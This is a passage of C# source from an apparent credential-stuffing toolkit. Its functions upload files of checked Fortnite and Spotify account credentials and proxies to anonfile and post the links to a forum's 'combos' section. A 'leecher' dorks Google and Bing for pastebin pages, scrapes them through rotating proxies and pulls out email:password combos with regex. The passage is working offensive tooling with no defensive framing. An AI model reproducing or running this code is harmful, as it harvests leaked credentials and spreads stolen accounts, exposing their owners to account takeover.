                        string LoginParams = string.Format("token&grant_type=password&username=" + ForumUser.Text + "&password=" + ForumPassword.Text + "&client_id=61d9aeb57203f5bd77fd78f68232b65b&scope=profile");
                        string LoginFinal1 = httpRequest.Post("https://tcm.tools/oauth/token/", LoginParams, "application/x-www-form-urlencoded").ToString();
                        JToken AccessToken = JObject.Parse(LoginFinal1)["access_token"];
                        string Access = AccessToken.ToString();
                        string ForumBodyContent = File.ReadAllText(validaccounts);
                        int ForumBodyContentLineCount = ForumBodyContent.Count(c => c.Equals('\n')) + 1;
                        string TempFile = Path.GetTempPath() + "//Fortnite Accounts Shared By TCM Tool (" + ForumBodyContentLineCount + ").txt";
                        File.WriteAllText(TempFile, ForumBodyContent);
                        string UploadedFileReturn = UploadFileToAnonFile(TempFile);
                        if (UploadedFileReturn.Contains("Exception Message"))
                        {
                            MessageBox.Show("ERROR UPLOADING FILE TO ANONFILE TO POST..");
                            MessageBox.Show(UploadedFileReturn);
                            return;
                        }
                        try
                        {
                            File.Delete(TempFile);
                        }
                        catch
                        {

                        }
                        httpRequest.AddHeader("Authorization", "Bearer " + SavedOathToken);
                        string Data = "forum=18-combos&title=Accounts Shared By TCM Tool (" + ForumBodyContentLineCount + ")&post=" + UploadedFileReturn;
                        string PostThread = httpRequest.Post("https://tcm.tools/api/forums/topics", Data, "application/x-www-form-urlencoded").ToString();
                        MessageBox.Show("Successfully Posted Hits!");

                    }
                    catch
                    {
                        MessageBox.Show("Oops something wen't wrong, Remember this function is still in beta, Try it again and be patient.");
                    }
                }
            }
            else if (dialogResult == DialogResult.No)
            {
                MessageBox.Show("Nothing Was Done, Move On, Thanks!");
            }
        }

        private void ShareUnbannedProxiesOnTheForum_Click(object sender, EventArgs e)
        {
            if (SharingDisabled == true)
            {
                MessageBox.Show("Can Only Share Once Every 5 Minutes!");
            }
            else
            {
                Thread StartSharingUnbannedProxies = new Thread(ShareUnbannedProxies);
                CheckForIllegalCrossThreadCalls = false;
                StartSharingUnbannedProxies.Start();
            }
        }

        private void ShareUnbannedProxies()
        {
            MessageBox.Show("Disabled Till Further Notice...");
            return;
            DialogResult dialogResult = MessageBox.Show("Are You Sure You Would Like To Post All Your Proxies You Have Gotten This Session?", "WAIT! ARE YOU SURE!", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                Thread DisabledSharing = new Thread(DisableSharing);
                CheckForIllegalCrossThreadCalls = false;
                DisabledSharing.Start();
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    try
                    {
                        string LoginParams = string.Format("token&grant_type=password&username=" + ForumUser.Text + "&password=" + ForumPassword.Text + "&client_id=61d9aeb57203f5bd77fd78f68232b65b&scope=profile");
                        string LoginFinal1 = httpRequest.Post("https://tcm.tools/oauth/token/", LoginParams, "application/x-www-form-urlencoded").ToString();
                        JToken AccessToken = JObject.Parse(LoginFinal1)["access_token"];
                        string Access = AccessToken.ToString();
                        string ForumBodyContent = File.ReadAllText(GoodProxiesSave);
                        int ForumBodyContentLineCount = ForumBodyContent.Count(c => c.Equals('\n')) + 1;
                        string TempFile = Path.GetTempPath() + "//Unbanned Proxies Shared By TCM Tool (" + ForumBodyContentLineCount + ").txt";
                        File.WriteAllText(TempFile, ForumBodyContent);
                        string UploadedFileReturn = UploadFileToAnonFile(TempFile);
                        if (UploadedFileReturn.Contains("Exception Message"))
                        {
                            MessageBox.Show("ERROR UPLOADING FILE TO ANONFILE TO POST..");
                            MessageBox.Show(UploadedFileReturn);
                            return;
                        }
                        try
                        {
                            File.Delete(TempFile);
                        }
                        catch
                        {

                        }

                        httpRequest.AddHeader("Authorization", "Bearer " + SavedOathToken);
                        string Data = "forum=17-proxies&title=Unbanned Proxies Shared By TCM Tool (" + ForumBodyContentLineCount + ")&post=" + UploadedFileReturn;
                        string PostThread = httpRequest.Post("https://tcm.tools/api/forums/topics", Data, "application/x-www-form-urlencoded").ToString();
                        MessageBox.Show("Successfully Posted Unbanned Proxies!");

                    }
                    catch
                    {
                        MessageBox.Show("Oops something wen't wrong, Remember this function is still in beta, Try it again and be patient.");
                    }
                }
            }
            else if (dialogResult == DialogResult.No)
            {
                MessageBox.Show("Nothing Was Done, Move On, Thanks!");
            }
        }

        private void ShareSpotifyAccountsOnForum_Click(object sender, EventArgs e)
        {
            if (SharingDisabled == true)
            {
                MessageBox.Show("Can Only Share Once Every 5 Minutes!");
            }
            else
            {
                Thread StartSharingSpotifyAccounts = new Thread(ShareSpotifyAccounts);
                CheckForIllegalCrossThreadCalls = false;
                StartSharingSpotifyAccounts.Start();
            }
        }

        private void ShareSpotifyAccounts()
        {
            MessageBox.Show("Disabled Till Further Notice...");
            return;
            DialogResult dialogResult = MessageBox.Show("Are You Sure You Would Like To Post All Your Proxies You Have Gotten This Session?", "WAIT! ARE YOU SURE!", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                Thread DisabledSharing = new Thread(DisableSharing);
                CheckForIllegalCrossThreadCalls = false;
                DisabledSharing.Start();
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    try
                    {
                        string LoginParams = string.Format("token&grant_type=password&username=" + ForumUser.Text + "&password=" + ForumPassword.Text + "&client_id=61d9aeb57203f5bd77fd78f68232b65b&scope=profile");
                        string LoginFinal1 = httpRequest.Post("https://tcm.tools/oauth/token/", LoginParams, "application/x-www-form-urlencoded").ToString();
                        JToken AccessToken = JObject.Parse(LoginFinal1)["access_token"];
                        string Access = AccessToken.ToString();
                        string ForumBodyContent1 = File.ReadAllText(SpotifyAccountPremium);
                        string ForumBodyContent2 = File.ReadAllText(SpotifyAccountFree);
                        string ForumBodyContent3 = File.ReadAllText(SpotifyAccountFamily);
                        string ForumBodyContent4 = File.ReadAllText(SpotifyAccountStudent);
                        int ForumBodyContentLineCount1 = ForumBodyContent1.Count(c => c.Equals('\n')) + 1;
                        int ForumBodyContentLineCount2 = ForumBodyContent2.Count(c => c.Equals('\n')) + 1;
                        int ForumBodyContentLineCount3 = ForumBodyContent3.Count(c => c.Equals('\n')) + 1;
                        int ForumBodyContentLineCount4 = ForumBodyContent4.Count(c => c.Equals('\n')) + 1;
                        int TotalAmountForumLineCount = ForumBodyContentLineCount1 + ForumBodyContentLineCount2 + ForumBodyContentLineCount3 + ForumBodyContentLineCount4;
                        string TempFile = Path.GetTempPath() + "//Spotify Accounts Shared By TCM Tool (" + TotalAmountForumLineCount + ").txt";
                        File.WriteAllText(TempFile, "Spotify Free Accounts:" + Environment.NewLine + ForumBodyContent2 + Environment.NewLine + Environment.NewLine +"Spotify Family Accounts:" + Environment.NewLine + ForumBodyContent3 + Environment.NewLine + Environment.NewLine + "Spotify Student Accounts:" + Environment.NewLine + ForumBodyContent4 + Environment.NewLine + Environment.NewLine + "Spotify Premium Accounts:" + Environment.NewLine + ForumBodyContent1);
                        string UploadedFileReturn = UploadFileToAnonFile(TempFile);
                        if (UploadedFileReturn.Contains("Exception Message"))
                        {
                            MessageBox.Show("ERROR UPLOADING FILE TO ANONFILE TO POST..");
                            MessageBox.Show(UploadedFileReturn);
                            return;
                        }
                        try
                        {
                            File.Delete(TempFile);
                        }
                        catch
                        {

                        }

                        httpRequest.AddHeader("Authorization", "Bearer " + SavedOathToken);
                        string Data = "forum=18-combos&title=Spotify Accounts Shared By TCM Tool (" + TotalAmountForumLineCount + ")&post=" + UploadedFileReturn;
                        string PostThread = httpRequest.Post("https://tcm.tools/api/forums/topics", Data, "application/x-www-form-urlencoded").ToString();
                        MessageBox.Show("Successfully Posted Spotify Accounts!");

                    }
                    catch(Exception e)
                    {
                        MessageBox.Show(e.Message);
                        MessageBox.Show("Oops something wen't wrong, Remember this function is still in beta, Try it again and be patient.");
                    }
                }
            }
            else if (dialogResult == DialogResult.No)
            {
                MessageBox.Show("Nothing Was Done, Move On, Thanks!");
            }
        }

        private void FindAllOfMyString(string searchString)
        {
            FnBattleRoyalLB.SelectionMode = SelectionMode.MultiExtended;
            for (int i = 0; i < FnBattleRoyalLB.Items.Count; i++)
            {
                if (FnBattleRoyalLB.Items[i].ToString().IndexOf(searchString, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    FnBattleRoyalLB.SetSelected(i, true);
                }
                else
                {
                    // Do this if you want to select in the ListBox only the results of the latest search.
                    FnBattleRoyalLB.SetSelected(i, false);
                }
            }
            int Amount = FnBattleRoyalLB.SelectedItems.Count;
            if (Amount == 0)
            {
                MessageBox.Show("No results found!");
            }
        }

        static string UploadFileToAnonFile(string File)
        {
            string ReturnValue = string.Empty;
            try
            {
                using (WebClient Client = new WebClient())
                {
                    byte[] Response = Client.UploadFile("https://anonfile.com/api/upload", File);
                    string ResponseBody = Encoding.ASCII.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                    {
                        ReturnValue += "There was a erorr while uploading the file.\r\n";
                        ReturnValue += "Error message: " + ResponseBody.Split('"')[7] + "\r\n";
                    }
                    else
                    {
                        ReturnValue += ResponseBody.Split('"')[15];
                    }
                }
            }
            catch (Exception Exception)
            {
                ReturnValue += "Exception Message:\r\n" + Exception.Message + "\r\n";
            }
            return ReturnValue;
        }


        private void SearchForContentButton_Click(object sender, EventArgs e)
        {
            FindAllOfMyString(SearchForContentTextBox.Text);
        }

        private void DisableSharing()
        {
            SharingDisabled = true;
            System.Threading.Thread.Sleep(300000);
            SharingDisabled = false;
        }
        private void nsButton34_Click(object sender, EventArgs e)
            {
            if (SharingDisabled == true)
            {
                MessageBox.Show("Can Only Share Once Every 5 Minutes!");
            }
            else
            {
                Thread StartSharingAliveProxies = new Thread(ShareAliveProxies);
                CheckForIllegalCrossThreadCalls = false;
                StartSharingAliveProxies.Start();
            }
        }

        private void ShareAliveProxies()
        {
            MessageBox.Show("Disabled Till Further Notice...");
            return;
            DialogResult dialogResult = MessageBox.Show("Are You Sure You Would Like To Post All Your Proxies You Have Gotten This Session?", "WAIT! ARE YOU SURE!", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                Thread DisabledSharing = new Thread(DisableSharing);
                CheckForIllegalCrossThreadCalls = false;
                DisabledSharing.Start();
                using (HttpRequest httpRequest = new HttpRequest())
                {
                    try
                    {
                        httpRequest.ClearAllHeaders();
                        httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                        httpRequest.KeepAlive = true;
                        httpRequest.Cookies = new CookieDictionary(false);
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.ConnectTimeout = 10000;
                        string LoginParams = string.Format("token&grant_type=password&username=" + ForumUser.Text + "&password=" + ForumPassword.Text + "&client_id=61d9aeb57203f5bd77fd78f68232b65b&scope=profile");
                        string LoginFinal1 = httpRequest.Post("https://tcm.tools/oauth/token/", LoginParams, "application/x-www-form-urlencoded").ToString();
                        JToken AccessToken = JObject.Parse(LoginFinal1)["access_token"];
                        string Access = AccessToken.ToString();
                        string ForumBodyContent = File.ReadAllText(RegularGoodProxiesChecked);
                        int ForumBodyContentLineCount = ForumBodyContent.Count(c => c.Equals('\n')) + 1;
                        string TempFile = Path.GetTempPath() + "//Alive Proxies Shared By TCM Tool (" + ForumBodyContentLineCount + ").txt";
                        File.WriteAllText(TempFile, ForumBodyContent);
                        string UploadedFileReturn = UploadFileToAnonFile(TempFile);
                        if(UploadedFileReturn.Contains("Exception Message"))
                        {
                            MessageBox.Show("ERROR UPLOADING FILE TO ANONFILE TO POST..");
                            MessageBox.Show(UploadedFileReturn);
                            return;
                        }
                        try
                        {
                            File.Delete(TempFile);
                        }
                        catch
                        {

                        }
                        if(EnableShareSettingsProxyAlive.Enabled)
                        {

                            httpRequest.AddHeader("Authorization", "Bearer " + SavedOathToken);
                            string Data = "forum=17-proxies&title=" + ProxyAliveShareSettingsTitle.Text + " ==> Alive Proxies Shared By TCM Tool (" + ForumBodyContentLineCount + ")&post=" + ProxyAliveShareSettingsBody.Text + "\n\n\n" + UploadedFileReturn;
                            string PostThread = httpRequest.Post("https://tcm.tools/api/forums/topics", Data, "application/x-www-form-urlencoded").ToString();
                        }
                        else
                        {
                            httpRequest.AddHeader("Authorization", "Bearer " + SavedOathToken);
                            string Data = "forum=17-proxies&title=Alive Proxies Shared By TCM Tool (" + ForumBodyContentLineCount + ")&post=" + UploadedFileReturn;
                            string PostThread = httpRequest.Post("https://tcm.tools/api/forums/topics", Data, "application/x-www-form-urlencoded").ToString();
                        }
                        MessageBox.Show("Successfully Posted Alive Proxies!");

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        MessageBox.Show("Oops something wen't wrong, Remember this function is still in beta, Try it again and be patient.");
                    }
                }
            }
            else if (dialogResult == DialogResult.No)
            {
                MessageBox.Show("Nothing Was Done, Move On, Thanks!");
            }
        }

        private void nsButton35_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default["ProxyAliveContentTitle"] = ProxyAliveShareSettingsTitle.Text;
            Properties.Settings.Default["ProxyAliveContentBody"] = ProxyAliveShareSettingsBody.Text;
            Settings.Default.Save();
        }

        private void nsButton36_Click(object sender, EventArgs e)
        {
            ProxyAliveShareSettingsTitle.Text = Settings.Default["ProxyAliveContentTitle"].ToString();
            ProxyAliveShareSettingsBody.Text = Settings.Default["ProxyAliveContentBody"].ToString();
        }

        private void nsButton37_Click(object sender, EventArgs e)
        {
            btnCombo_Click(null, null);
        }

        private void StartRandomizedCombos()
        {
            while (Combo.Count > 0)
            {
                string RandomizedComboToAdd = Combo.ElementAt<string>(rnd.Next(Combo.Count));
                RandomizeComboRandomizer.Items.Add(RandomizedComboToAdd);
                Combo.Remove(RandomizedComboToAdd);
                ComboRandomzerCheckLeft.Text = Combo.Count().ToString();
                if(!RandomizerDisableAutoScroller.Checked)
                {
                    RandomizeComboRandomizer.SelectedIndex = RandomizeComboRandomizer.Items.Count - 1;
                }
            }
            MessageBox.Show("All Combos Randomized!");
        }
        private void nsButton38_Click(object sender, EventArgs e)
        {
            RandomizeComboRandomizer.Items.Clear();
            Thread RandomizeMyShit = new Thread(StartRandomizedCombos);
            CheckForIllegalCrossThreadCalls = false;
            RandomizeMyShit.Start();
        }
        private void ExtractingCobmos()
        {
            try
            {
                string LoadFileToExtractCombos = ExtractorPathFinal;
                string ExtractDataFrom = File.ReadAllText(LoadFileToExtractCombos);
                string re1 = "([\\w-+]+(?:\\.[\\w-+]+)*@(?:[\\w-]+\\.)+[a-zA-Z]{2,7})"; // Email Address 1
                string re2 = "(.)"; // Any Single Character 1
                string re3 = "((?:[a-z][a-z]*[0-9]+[a-z0-9]*))";    // Alphanum 1
                string re4 = "(\\s+)";  // White Space 1

                Regex r = new Regex(re1 + re2 + re3 + re4, RegexOptions.IgnoreCase | RegexOptions.Singleline);
                foreach (Match ExtractedCombos in r.Matches(ExtractDataFrom))
                {
                    ExtractedCombosFromFile.Items.Add(ExtractedCombos);

                    if (!DisableAutoScrollerForComboextractorKekLongestNameInTheDamnWorldHaha.Checked)
                    {
                        ExtractedCombosFromFile.SelectedIndex = ExtractedCombosFromFile.Items.Count - 1;
                    }
                    ExtractedCombosCounter.Text = ExtractedCombosFromFile.Items.Count.ToString();
                }
                MessageBox.Show("Successfully Extracted " + ExtractedCombosFromFile.Items.Count.ToString() + " Combos From File!");
            }
            catch
            {
                MessageBox.Show("Unknown error has occured!");
                return;
            }
        }

        public static string ExtractorPathFinal;
        private void ExtractCombosLoadFile_Click(object sender, EventArgs e)
        {
            ExtractedCombosFromFile.Items.Clear();
            ExtractorPathFinal = null;
            OpenFileDialog ExtractorPath = new OpenFileDialog();
            ExtractorPath.Filter = "Text File | *.txt";
            ExtractorPath.RestoreDirectory = true;
            ExtractorPath.Multiselect = false;
            ExtractorPath.Filter = "Text Files (*.txt)|*.txt";
            ExtractorPath.FilterIndex = 1;
            if (ExtractorPath.ShowDialog() == DialogResult.OK)
                {
                ExtractorPathFinal = ExtractorPath.FileName;
                Thread ExtractingCombosTime = new Thread(ExtractingCobmos);
                CheckForIllegalCrossThreadCalls = false;
                ExtractingCombosTime.Start();
            }
            else
            {
                MessageBox.Show("Path not chosen or something else wen't wrong, Try again!");
                return;
            }
        }

        private void SaveExtractedList_Click(object sender, EventArgs e)
        {
            string StartedExtractingDirectory = "Extracted Combos\\";
            if (ExtractedCombosFromFile.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Can't save nothing dumb dumb...");
                return;
            }
            if (ExtractedCombosFromFile.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Extracted Combos"))
                    {
                        Directory.CreateDirectory("Extracted Combos");
                    }
                    string ComboExtractedAmount = ExtractedCombosFromFile.Items.Count.ToString();
                    string SaveFileNameComboExtractor = StartedExtractingDirectory + ComboExtractedAmount + "Combos Extracted From TCM's Tool" + ".txt";
                    System.IO.StreamWriter ExtractedCombosSaver = new System.IO.StreamWriter(SaveFileNameComboExtractor);
                    foreach (var ExtractedItems in ExtractedCombosFromFile.Items)
                    {
                        ExtractedCombosSaver.WriteLine(ExtractedItems);
                    }
                    ExtractedCombosSaver.Close();
                    MessageBox.Show(ComboExtractedAmount + " Combos Successfully Saved!");
                    Process.Start(SaveFileNameComboExtractor);                
                }
                catch
                {
                    MessageBox.Show("Unknown Error Occured!");
                }
            }
        }

        private void nsButton39_Click(object sender, EventArgs e)
        {
            string StartedExtractingDirectory = "Randomized Combos\\";
            if (RandomizeComboRandomizer.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Can't save nothing dumb dumb...");
                return;
            }
            if (RandomizeComboRandomizer.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Randomized Combos"))
                    {
                        Directory.CreateDirectory("Randomized Combos");
                    }
                    string CombosRandomizedAmount = RandomizeComboRandomizer.Items.Count.ToString();
                    string SaveFileComboRanomizer = StartedExtractingDirectory + CombosRandomizedAmount + "Randomized Combos From TCM's Tool" + ".txt";
                    System.IO.StreamWriter RandomizedComboSaver = new System.IO.StreamWriter(SaveFileComboRanomizer);
                    foreach (var ExtractedItems in RandomizeComboRandomizer.Items)
                    {
                        RandomizedComboSaver.WriteLine(ExtractedItems);
                    }
                    RandomizedComboSaver.Close();
                    MessageBox.Show(CombosRandomizedAmount + " Combos Successfully Saved!");
                    Process.Start(SaveFileComboRanomizer);
                }
                catch
                {
                    MessageBox.Show("Unknown Error Occured!");
                }
            }
        }

        private void StartGrabbingBingUrls(object sender, DoWorkEventArgs e)
        {
            checked
            {
                try
                {
                    string[] array = LeecherKeyWords.Text.Split(new char[]
                    {
                    '\r'
                    });
                    int num = 0;
                    while (true)
                    {
                        if (num < array.Length)
                        {
                            string text = array[num];
                            try
                            {
                                string text2 = new HttpRequest
                                {
                                    ConnectTimeout = 10000,
                                    Proxy = null,
                                    AllowAutoRedirect = true,
                                    KeepAlive = true,
                                    IgnoreProtocolErrors = true
                                }.Get(string.Concat(new string[]{"https://www.bing.com/search?q=site:pastebin.com+",text,"&num=100&tbs=qdr:"+UseAllForgoogle+"&ei=-d2PUqnoIOyp7AbP2IGoBQ&start=",Convert.ToString(200),"&sa=N&biw=1366&bih=604"}), null).ToString();
                                ReturnStringParse.Text = text2;
                                MatchCollection matchCollection = new Regex("(https\\:\\/\\/pastebin\\.com\\/[a-zA-Z1-9]*)").Matches(ReturnStringParse.Text);
                                StringBuilder stringBuilder = new StringBuilder();
                                try
                                {
                                    IEnumerator enumerator = matchCollection.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        stringBuilder.AppendLine(((Match)enumerator.Current).ToString());
                                    }
                                }
                                finally
                                {

                                }
                                ReturnedPastebinLinks.Text = ReturnedPastebinLinks.Text + stringBuilder.ToString();
                                LeecherTotalLinks.Text = ReturnedPastebinLinks.Lines.Count().ToString();
                                MatchCollection matchCollection2 = new Regex("(https\\:\\/\\/pastebin\\.com\\/[a-zA-Z1-9]*)").Matches(ReturnStringParse.Text);
                                StringBuilder stringBuilder2 = new StringBuilder();
                                try
                                {
                                    IEnumerator enumerator2 = matchCollection2.GetEnumerator();
                                    while (enumerator2.MoveNext())
                                    {
                                        stringBuilder2.AppendLine(((Match)enumerator2.Current).ToString());
                                    }
                                }
                                finally
                                {

                                }
                                ReturnedPastebinLinks.Text = ReturnedPastebinLinks.Text + stringBuilder2.ToString();
                                LeecherTotalLinks.Text = ReturnedPastebinLinks.Lines.Count().ToString();
                                ReturnedPastebinLinks.SelectionStart = ReturnedPastebinLinks.TextLength;
                                ReturnedPastebinLinks.ScrollToCaret();
                                if (backgroundWorker_1.CancellationPending)
                                {
                                    e.Cancel = true;
                                    break;
                                }
                            }
                            catch
                            {

                            }
                            num++;
                        }
                    }
                }
                catch
                {

                }
            }
        }

        internal virtual BackgroundWorker BackgroundWorker_1
        {
            get
            {
                return backgroundWorker_1;
            }
            set
            {
                DoWorkEventHandler value2 = new DoWorkEventHandler(StartGrabbingBingUrls);
                if (backgroundWorker_1 != null)
                {
                    backgroundWorker_1.DoWork -= value2;
                }
                backgroundWorker_1 = value;
                if (backgroundWorker_1 != null)
                {
                    backgroundWorker_1.DoWork += value2;
                }
            }
        }

        private int RandomizeGoogleLink()
        {
            return new Random().Next(0, 5);
        }

        private string RandomGoogleExtension()
        {
            return GoogleLinkRandom[RandomizeGoogleLink()];
        }
        HttpRequest RequestingHttp = new HttpRequest();
        private void StartGrabbingGoogleUrls(object sender, DoWorkEventArgs e)
        {
            checked
            {
                try
                {
                    int num = 1;
                    string[] array = LeecherKeyWords.Text.Split(new char[] { '\r' });
                    for (int i = 0; i < array.Length; i++)
                    {
                        string text = array[i];
                        string accountdetails = RequestingHttp.Get(string.Format(string.Concat(new string[] { "https://www.google." + RandomGoogleExtension() + "/search?q=site:pastebin.com+", text, "&num=100&tbs=qdr:", UseAllForgoogle }))).ToString();
                        string text3 = accountdetails;
                        ReturnStringParse.Text = text3;
                        MatchCollection matchCollection = new Regex("(https\\:\\/\\/pastebin\\.com\\/[a-zA-Z1-9]*)").Matches(ReturnStringParse.Text);
                        StringBuilder stringBuilder = new StringBuilder();
                        try
                        {
                            IEnumerator enumerator = matchCollection.GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                stringBuilder.AppendLine(((Match)enumerator.Current).ToString());
                            }
                        }
                        finally
                        {

                        }
                        ReturnedPastebinLinks.Text = ReturnedPastebinLinks.Text + stringBuilder.ToString();
                        LeecherTotalLinks.Text = ReturnedPastebinLinks.Lines.Count().ToString();
                        MatchCollection matchCollection2 = new Regex("(https\\:\\/\\/pastebin\\.com\\/[a-zA-Z1-9]*)").Matches(ReturnStringParse.Text);
                        StringBuilder stringBuilder2 = new StringBuilder();
                        try
                        {
                            IEnumerator enumerator2 = matchCollection2.GetEnumerator();
                            while (enumerator2.MoveNext())
                            {
                                stringBuilder2.AppendLine(((Match)enumerator2.Current).ToString());
                            }
                        }
                        finally
                        {

                        }
                        ReturnedPastebinLinks.Text = ReturnedPastebinLinks.Text + stringBuilder2.ToString();
                        LeecherTotalLinks.Text = ReturnedPastebinLinks.Lines.Count().ToString();
                        ReturnedPastebinLinks.SelectionStart = ReturnedPastebinLinks.TextLength;
                        ReturnedPastebinLinks.ScrollToCaret();
                        num++;
                        if (BackgroundWorker_8.CancellationPending)
                        {
                            e.Cancel = true;
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        internal virtual BackgroundWorker BackgroundWorker_8
        {
            get
            {
                return backgroundWorker_8;
            }
            set
            {
                DoWorkEventHandler value2 = new DoWorkEventHandler(StartGrabbingGoogleUrls);
                if (backgroundWorker_8 != null)
                {
                    backgroundWorker_8.DoWork -= value2;
                }
                backgroundWorker_8 = value;
                if (backgroundWorker_8 != null)
                {
                    backgroundWorker_8.DoWork += value2;
                }
            }
        }

        private void LeecherStart_Click(object sender, EventArgs e)
        {
            LeecherTotalKeyWordsUsed.Text = LeecherKeyWords.Lines.Count().ToString();
            BackgroundWorker_8.RunWorkerAsync();
            BackgroundWorker_1.RunWorkerAsync();
            CheckForIllegalCrossThreadCalls = false;
        }

        private void LeecherStop_Click(object sender, EventArgs e)
        {
            BackgroundWorker_8.CancelAsync();
            BackgroundWorker_1.CancelAsync();
        }

        public void RemoveDupedCombos()
        {
            string[] source = ReturnedPastebinLinks.Text.Split(new string[]
            {
            "\r\n"
            }, StringSplitOptions.RemoveEmptyEntries);
            source.Distinct<string>().Count<string>();
            ReturnedPastebinLinks.Text = string.Join("\r\n", source.Distinct<string>());
            LeecherTotalLinks.Text = ReturnedPastebinLinks.Lines.Count().ToString();
            MessageBox.Show("Duplicate Removed");
        }
        private void LeecherRemoveDupeLinks_Click(object sender, EventArgs e)
        {
            Thread DupesCombosRemoved = new Thread(RemoveDupedCombos);
            CheckForIllegalCrossThreadCalls = false;
            DupesCombosRemoved.Start();
        }
        HttpRequest RequestHttpForCombos = new HttpRequest();

        public void GrabLeechedCombos(object sender, DoWorkEventArgs e)
        {
            Form1.strarray = ReturnedPastebinLinks.Lines;
            int NumberOfLinks = ReturnedPastebinLinks.Lines.Count();
            try
            {
                LeecherTotalProgressDone.MaxValue = NumberOfLinks;
            }
            catch { }
            int ComboSearchInex = 0;
            int ProxyBadProxies = 0;
            while (true)
            {
                try
                {
                    while (ComboSearchInex <= Form1.strarray.Length)
                    {
                        ++ComboSearchInex;
                        RequestHttpForCombos.ClearAllHeaders();
                        int ProxyTimeoutTimer = (int)2000;
                        RequestHttpForCombos.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                        RequestHttpForCombos.KeepAlive = true;
                        RequestHttpForCombos.Cookies = new CookieDictionary(false);
                        RequestHttpForCombos.IgnoreProtocolErrors = true;
                        RequestHttpForCombos.ConnectTimeout = ProxyTimeoutTimer;
                        RequestHttpForCombos.AllowAutoRedirect = false;
                        if (Proxies.Count == 0)
                        {
                            RequestHttpForCombos.Proxy = null;
                        }
                        else
                        {
                            RequestHttpForCombos.Proxy = GetPClient(Proxies.ElementAt<string>(rnd.Next(Proxies.Count)));
                            RequestHttpForCombos.Proxy.ConnectTimeout = ProxyTimeoutTimer;
                        }
                        string CombosGrabbing = RequestHttpForCombos.Get(Form1.strarray[ComboSearchInex]).ToString();
                        string textbox4 = CombosGrabbing;
                        if(LeechSomeCombos.Checked)
                        {
                            MatchCollection matchCollection1 = new Regex("([a-zA-Z0-9._%+-]+@(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,6}:(?:[a-zA-Z0-9]{5,}))").Matches(textbox4);
                            foreach (Match match1 in matchCollection1)
                            {
                                LeecherCombos.Items.Add((object)match1.Value);
                                int count = LeecherCombos.Items.Count;
                                LeecherTotalCombosFound.Text = count.ToString();
                                label2.Text = ComboSearchInex.ToString();
                                try
                                {
                                    LeecherTotalProgressDone.Value = ComboSearchInex;
                                }
                                catch { }
                                LeecherCombos.SelectedIndex = LeecherCombos.Items.Count - 1;
                                TotalLinkedCheckedComboLeecher.Text = ComboSearchInex + "/" + NumberOfLinks.ToString();
                            }
                        }
                        else if(LeechSomeProxies.Checked)
                        {
                            MatchCollection matchCollection1 = new Regex(@"\d{1,3}(\.\d{1,3}){3}:\d{1,5}").Matches(textbox4);
                            foreach (Match match1 in matchCollection1)
                            {
                                LeecherCombos.Items.Add((object)match1.Value);
                                int count = LeecherCombos.Items.Count;
                                LeecherTotalCombosFound.Text = count.ToString();
                                label2.Text = ComboSearchInex.ToString();
                                try
                                {
                                    LeecherTotalProgressDone.Value = ComboSearchInex;
                                }
                                catch { }
                                LeecherCombos.SelectedIndex = LeecherCombos.Items.Count - 1;
                                TotalLinkedCheckedComboLeecher.Text = ComboSearchInex + "/" + NumberOfLinks.ToString();
                            }
                        }
                        if (backgroundWorker_5.CancellationPending)
                        {
                            e.Cancel = true;
                            break;
                        }
                    }
                    break;
                }

                catch (Exception ex)
                {
                    try
                    {
                        Proxies.RemoveAll(s => s.TrimStart().StartsWith(RequestHttpForCombos.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                    }
                    catch { }
                    Proxies.RemoveAll(s => s.TrimStart().StartsWith(RequestHttpForCombos.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                    ProxyBadProxies = ProxyBadProxies + 1;
                    ProxiesReturningBadOrError.Text = ProxyBadProxies.ToString();
                }
            }
            LeecherTotalProgressDone.Value = LeecherTotalProgressDone.MaxValue;
            TotalLinkedCheckedComboLeecher.Text = NumberOfLinks.ToString() + "/" + NumberOfLinks.ToString();
            LeecherCombos.SelectedIndex = LeecherCombos.Items.Count - 1;
            MessageBox.Show("Leeching Finished!");
        }
        internal virtual BackgroundWorker BackgroundWorker_5
        {
            get
            {
                return backgroundWorker_5;
            }
            set
            {
                DoWorkEventHandler value2 = new DoWorkEventHandler(GrabLeechedCombos);
                if (backgroundWorker_5 != null)
                {
                    backgroundWorker_5.DoWork -= value2;
                }
                backgroundWorker_5 = value;
                if (backgroundWorker_5 != null)
                {
                    backgroundWorker_5.DoWork += value2;
                }
            }
        }

        private void LeecherGrabCombos_Click(object sender, EventArgs e)
        {
            string TextBox3textIs = ReturnedPastebinLinks.Text;
            if(!ReturnedPastebinLinks.Text.Contains("pastebin.com/raw/"))
            {
                ReturnedPastebinLinks.Text = ReturnedPastebinLinks.Text.Replace("pastebin.com/", "pastebin.com/raw/");
            }
            BackgroundWorker_5.RunWorkerAsync();
            CheckForIllegalCrossThreadCalls = false;
        }

        private void RemoveThemDupedCombos()
        {
            var LeechedItems = LeecherCombos.Items.Cast<string>().Distinct().ToArray();
            LeecherCombos.Items.Clear();
            foreach (var LeechedCombos in LeechedItems)
            {
                LeecherCombos.Items.Add(LeechedCombos);
            }
            int count = LeecherCombos.Items.Count;
            LeecherTotalCombosFound.Text = count.ToString();
        }

